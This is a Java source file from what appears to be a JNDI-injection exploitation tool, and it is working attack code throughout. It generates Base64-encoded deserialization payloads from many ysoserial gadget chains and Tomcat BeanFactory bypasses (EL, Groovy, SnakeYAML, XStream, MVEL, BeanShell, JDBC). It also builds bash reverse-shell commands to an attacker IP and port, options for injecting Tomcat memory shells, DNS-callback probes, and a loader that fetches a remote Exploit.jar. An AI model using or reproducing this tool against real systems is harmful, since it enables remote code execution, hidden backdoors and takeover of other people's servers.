package com.bloom.exploit;

import com.bloom.payload.*;
import com.unboundid.util.Base64;
import org.apache.naming.ResourceRef;
import ysoserial.Serializer;
import ysoserial.payloads.CommonsBeanutils183NOCC;
import ysoserial.payloads.CommonsBeanutils192NOCC;
import ysoserial.payloads.ObjectPayload;
import javax.naming.StringRefAddr;

import java.text.ParseException;

import static com.bloom.payload.JDBCRce.*;
import static com.bloom.payload.MletFuzz.Fuzzpayload;
import static com.bloom.util.Functions.*;

public class payload {

    public static String getPayload(String payloadType, String command) {
        String bs = "";
        Class payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        try {
            ObjectPayload e = (ObjectPayload)payloadClass.newInstance();
            Object object = e.getObject(command);
            byte[] ser = Serializer.serialize(object);
            ObjectPayload.Utils.releasePayload(e, object);
            bs = Base64.encode(ser);
        } catch (Throwable var7) {
            System.err.println("Error while generating or serializing payload");
            var7.printStackTrace();
            System.exit(70);
        }
        return bs;
    }

//    public static String getBaseData(String gadget, String command) {
//        String base_data = "";
//
//        try {
//            base_data = getPayload(gadget, command);
//        } catch (Exception var4) {
//        }
//
//        return base_data;
//    }

    public static String choiceType(String base) throws Exception {
        //base=/fuzz2/C3P0/r21zh1.ceye.io

        String Type=base.split("/")[0].toLowerCase(); //bypass
        String PayloadType=base.split("/")[1]; //EL
        String method=base.split("/")[2]; //reverseshell
        String command="";
        if (Type.equals("fuzz")){//FUZZ模块
            String FuzzClaszz=base.split("/")[1];
            String URL=base.split("/")[2];
            String s=Fuzzpayload(FuzzClaszz,URL);
            return s;
        }else if (Type.equals("fuzz2")){//FUZZ模块2
//            Curl dns
//            String FuzzClaszz=base.split("/")[1];
            String URL=base.split("/")[2];

            if(PayloadType.equals("C3P0")){
                command="http://C3P0."+URL+":80:Exploit";
            }else if(PayloadType.equals("snakeyaml")){
                command="http://snakeyaml."+URL+":80/Exploit.jar";//http://127.0.0.1:8888/exp.jar
            }else {
                String dns = PayloadType + "." + URL;
                command = "curl " + dns + " || ping -c 3 " + dns + " || ping " + dns;
            }

            String s=payload.generatePayload( PayloadType, command);
            System.out.println("使用payloadType："+PayloadType+"，commond："+command);
            return s;
        } else if (Type.equals("bypass")) {
            //base=/bypass/mvel/base64/b3BlbiAtYSBRUQ==
            if(method.equals("base64")){//Base64执行命令
                command=Base64.decodeToString(base.split("/")[3]);
            }else if(method.equals("reverseshell")){//反弹shell
                String ip=base.split("/")[3];
                String port=base.split("/")[4];
                if(ipCheck(ip)) {
                    command = "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                }else {
                    System.out.println("ip格式不正确");
                    return null;
                }
            }else if(method.equals("reverseshell2")){//反弹shell
                String ip=base.split("/")[3];
                String port=base.split("/")[4];
                if(ipCheck(ip)) {
                    command =  "bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
                }else {
                    System.out.println("ip格式不正确");
                    return null;
                }
            } else {
                command=base.substring(base.indexOf("/")+1);
                command=command.substring(command.indexOf("/")+1);
            }
            String s=payload.generatePayload( PayloadType, command);
            System.out.println("使用payloadType："+PayloadType+"，commond："+command);
            return s;
        }else {
            return null;
        }
    }

    public static String choiceTypeByswitch(String base) throws Exception {
        //base=/fuzz/C3P0/r21zh1.ceye.io
        //base=/EL/memshell/tomcatmemshell1
        String Type=base.split("/")[0].toLowerCase(); //fuzz
        String PayloadType=base.split("/")[1]; //EL
        String method = null; //reverseshell
        String command = null;
        String s;
        switch (Type) {
            case "fuzz":
                String URL=base.split("/")[2];
                if(PayloadType.equals("C3P0")){
                    command="http://C3P0."+URL+":80:Exploit";
                }else if(PayloadType.equals("snakeyaml")){
                    command="http://snakeyaml."+URL+":80/Exploit.jar";//http://127.0.0.1:8888/exp.jar
                } else {
                    String dns = PayloadType + "." + URL;
                    command = "curl " + dns + " || ping -c 3 " + dns + " || ping " + dns;
                }
                break;
            case "fuzzbyDNS":
                URL=base.split("/")[1];
                command=URL;
            default:
                method=base.split("/")[1];
                PayloadType=base.split("/")[0];
                //base=/EL/memshell/tomcatmemshell1
                command=choiceMethod(method,base.substring(base.indexOf("/")+1));//  base.substring(base.indexOf("/",base.indexOf("/")+1)+1)=base64/b3BlbiAtYSBjYWxjdWxhdG9y
                break;
        }
        s=payload.generatePayload( PayloadType, command);
        if(s!=null){
            System.out.println("使用payloadType："+PayloadType+"，commond："+command);
        }
        return s;
    }



    public static String choiceMethod(String method,String base) throws ParseException {
        String ip;
        String port;
        String command;
        switch (method){
            case "base64":
                //   base64/b3BlbiAtYSBjYWxjdWxhdG9y
                command=Base64.decodeToString(base.split("/")[1]);
                break;
            case "reverseshell":
                //  reverseshell/127.0.0.1/4444
                ip=base.split("/")[1];
                port=base.split("/")[2];
                if(ipCheck(ip)) {
                    command = "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                }else {
                    System.out.println("反弹IP格式不正确");
                    return null;
                }
                break;
            case "reverseshell2":
                ip=base.split("/")[1];
                port=base.split("/")[2];
                if(ipCheck(ip)) {
                    command =  "bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
                }else {
                    System.out.println("反弹IP格式不正确");
                    return null;
                }
                break;
            case "memshell":
                String Memshelltype=base.substring(9);
                if (Memshelltype.startsWith("FILE:")){
//                    command="FILE:/Users/lvzhibo/IdeaProjects/JNDIInject/data/Exploit.class";
                    command=Memshelltype;
                }else {
                    command = "CLASS:" + Memshelltype; //   Memshelltype = TomcatFilterMemShellFromThread   //CLASS:TomcatFilterMemShellFromThread
                }
                break;
            default :
                command=base;
                break;
        }
        return command;
    }

    public static String generatePayload(String payloadType, String command) throws Exception {
        ResourceRef ref;
        Object object;
        byte[] ser;
        switch (payloadType) {
            case "CommonsBeanutils1":
                String s = payload.getPayload("CommonsBeanutils1", command);
                return s;
            case "CommonsCollections1":
                s = payload.getPayload("CommonsCollections1", command);
                return s;
            case "CommonsCollections2":
                s = payload.getPayload("CommonsCollections2", command);
                return s;
            case "CommonsCollections3":
                s = payload.getPayload("CommonsCollections3", command);
                return s;
            case "CommonsCollections4":
                s = payload.getPayload("CommonsCollections4", command);
                return s;
            case "CommonsCollections5":
                s = payload.getPayload("CommonsCollections5", command);
                return s;
            case "CommonsCollections6":
                s = payload.getPayload("CommonsCollections6", command);
                return s;
            case "CommonsCollections7":
                s = payload.getPayload("CommonsCollections7", command);
                return s;
            case "CommonsCollections8":
                s = payload.getPayload("CommonsCollections8", command);
                return s;
            case "CommonsCollections12":
                s = payload.getPayload("CommonsCollections12", command);
                return s;
            case "CommonsCollectionsK1":
                s = payload.getPayload("CommonsCollectionsK1", command);
                return s;
            case "CommonsCollectionsK2":
                s = payload.getPayload("CommonsCollectionsK2", command);
                return s;
            case "CommonsCollectionsK3":
                s = payload.getPayload("CommonsCollectionsK3", command);
                return s;
            case "CommonsCollectionsK4":
                s = payload.getPayload("CommonsCollectionsK4", command);
                return s;
            case "CommonsCollectionsK1TomcatEcho":
                s = payload.getPayload("CommonsCollectionsK1TomcatEcho", "a");
                return s;
            case "CommonsCollectionsK2TomcatEcho":
                s = payload.getPayload("CommonsCollectionsK2TomcatEcho", "a");
                return s;
            case "C3P0":
                s = payload.getPayload("C3P0", command);//command=http://127.0.0.1:8080:Exploit
                return s;
//            case "groovy1": //
//                s = payload.getPayload("Groovy1", command);
//                return s;
            case "EL":
                TomcatByPass EL=new TomcatByPass();
                String finalPayload = EL.evalPoc(command);
                if (finalPayload == ""){
                    return null;
                }
                ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));
                ref.add(new StringRefAddr("x", finalPayload));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "groovyBytomcat":
                ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
                ref.add(new StringRefAddr("forceString", "x=parseClass"));
                String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef x\n", command);
                ref.add(new StringRefAddr("x",script));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "URLDNS":
                if (command.startsWith("http")) {
                    command="URLDNS."+command;
                } else {
                    command="http://URLDNS." + command;
                }
                s = payload.getPayload("URLDNS", command);
                return s;
            case "Clojure":
                s=payload.getPayload("Clojure",command);
                return s;
            case "BeanShell1":
                s=payload.getPayload("BeanShell1",command);
                return s;
            case "JSON1":
                s=payload.getPayload("JSON1",command);
                return s;
            case "Spring1":
                s=payload.getPayload("Spring1",command);
                return s;
            case "Spring2":
                s=payload.getPayload("Spring2",command);
                return s;
            case "Hibernate1":
                s=payload.getPayload("Hibernate1",command);
                return s;
//            case "Myfaces1":
//                s=payload.getPayload("Myfaces1",command);
//                return s;
            case "MozillaRhino1":
                s=payload.getPayload("MozillaRhino1",command);
                return s;
            case "rome":
                s=payload.getPayload("ROME",command);
                return s;
            case "snakeyaml"://commond=http://127.0.0.1:8888/exp.jar
                ref= new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                String yaml = "!!javax.script.ScriptEngineManager [\n" +
                        "  !!java.net.URLClassLoader [[\n" +
                        "    !!java.net.URL [\""+command+"\"]\n" +
                        "  ]]\n" +
                        "]";
                ref.add(new StringRefAddr("forceString", "a=load"));
                ref.add(new StringRefAddr("a", yaml));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "XStream":
                ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                        "  <unserializable-parents/>\n" +
                        "  <java.util.PriorityQueue>\n" +
                        "    <default>\n" +
                        "      <size>2</size>\n" +
                        "    </default>\n" +
                        "    <int>3</int>\n" +
                        "    <dynamic-proxy>\n" +
                        "      <interface>java.lang.Comparable</interface>\n" +
                        "      <handler class='sun.tracing.NullProvider'>\n" +
                        "        <active>true</active>\n" +
                        "        <providerType>java.lang.Comparable</providerType>\n" +
                        "        <probes>\n" +
                        "          <entry>\n" +
                        "            <method>\n" +
                        "              <class>java.lang.Comparable</class>\n" +
                        "              <name>compareTo</name>\n" +
                        "              <parameter-types>\n" +
                        "                <class>java.lang.Object</class>\n" +
                        "              </parameter-types>\n" +
                        "            </method>\n" +
                        "            <sun.tracing.dtrace.DTraceProbe>\n" +
                        "              <proxy class='java.lang.Runtime'/>\n" +
                        "              <implementing__method>\n" +
                        "                <class>java.lang.Runtime</class>\n" +
                        "                <name>exec</name>\n" +
                        "                <parameter-types>\n" +
                        "                  <class>java.lang.String</class>\n" +
                        "                </parameter-types>\n" +
                        "              </implementing__method>\n" +
                        "            </sun.tracing.dtrace.DTraceProbe>\n" +
                        "          </entry>\n" +
                        "        </probes>\n" +
                        "      </handler>\n" +
                        "    </dynamic-proxy>\n" +
                        "    <string>"+command+"</string>\n" +
                        "  </java.util.PriorityQueue>\n" +
                        "</java.util.PriorityQueue>";
                ref.add(new StringRefAddr("forceString", "a=fromXML"));
                ref.add(new StringRefAddr("a", xml));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "mvel":  //command= L|command (Liunx)或者W|command(Windows)
                ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "a=exec"));
                ref.add(new StringRefAddr("a",
                        "push Runtime.getRuntime().exec('"+SpacePass(command)+"');"));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "tomcat_dbcp1_RCE":
                s = Base64.encode(Serializer.serialize(tomcat_dbcp1_RCE(command)));
                return s;
            case "tomcat_dbcp2_RCE":
                s = Base64.encode(Serializer.serialize(tomcat_dbcp2_RCE(command)));
                return s;
            case "commons_dbcp1_RCE":
                s = Base64.encode(Serializer.serialize(commons_dbcp1_RCE(command)));
                return s;
            case "commons_dbcp2_RCE":
                s = Base64.encode(Serializer.serialize(commons_dbcp2_RCE(command)));
                return s;
            case "druidjdbc":
                s = Base64.encode(Serializer.serialize(druidjdbc(command)));
                return s;
            case "tomcatjdbc":
                s = Base64.encode(Serializer.serialize(tomcatJDBC(command)));
                return s;
            case "BeanShell2":
                ref = new ResourceRef("bsh.Interpreter", null, "", "",
                        true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "a=eval"));
                ref.add(new StringRefAddr("a", "exec(\""+command+"\")"));
                s = Base64.encode(Serializer.serialize(ref));
                return s;
            case "Vaadin1":
                s=payload.getPayload("Vaadin1",command);
                return s;
            case "CommonsBeanutils192NOCC":
                CommonsBeanutils192NOCC commonsBeanutils192NOCC=new CommonsBeanutils192NOCC();
                object = commonsBeanutils192NOCC.getObject(command);
                ser = Serializer.serialize(object);
                s = Base64.encode(ser);
                return s;
            case "CommonsBeanutils183NOCC":
                CommonsBeanutils183NOCC commonsBeanutils183NOCC=new CommonsBeanutils183NOCC();
                object = commonsBeanutils183NOCC.getObject(command);
                ser = Serializer.serialize(object);
                s = Base64.encode(ser);
                return s;
            case "fuzzbyDNS":
                s=payload.getPayload("FindGadgetByDNS",command);
                return s;
            default:
                return null;
        }
    }

    public static void main(String[] args) {
        String s= getPayload("CommonsCollectionsK1","open /System/Applications/Calculator.app");
        System.out.println(s);

    }
}
